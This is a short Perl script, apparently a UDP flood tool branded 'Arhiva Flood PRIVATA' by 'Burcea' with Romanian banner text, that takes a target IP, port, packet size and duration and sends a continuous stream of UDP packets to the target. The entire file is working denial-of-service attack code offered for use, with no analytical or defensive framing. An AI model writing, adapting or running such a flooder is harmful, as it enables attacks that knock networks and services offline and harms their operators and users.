#!/usr/bin/perl

##
# Burcea<----
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "perl capitan <ip> <port> <pachets> <time> $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);


printf "[1;35m#[1;33m#[1;31m*[0;32m Arhiva Flood [0;31mPRIVATA [0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m By [1;33mBurcea [1;36m2015-2016 [0m\n";
printf "[1;35m#[1;33m#[1;31m*[0;32m Intrerupe flood-ul tastand comanda [1;36mCTRL+C [0m\n";

for (;time() <= $endtime;) {
$psize = $size ? $size : int(rand(1500000-64)+64) ;
$pport = $port ? $port : int(rand(1500000))+1;

send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}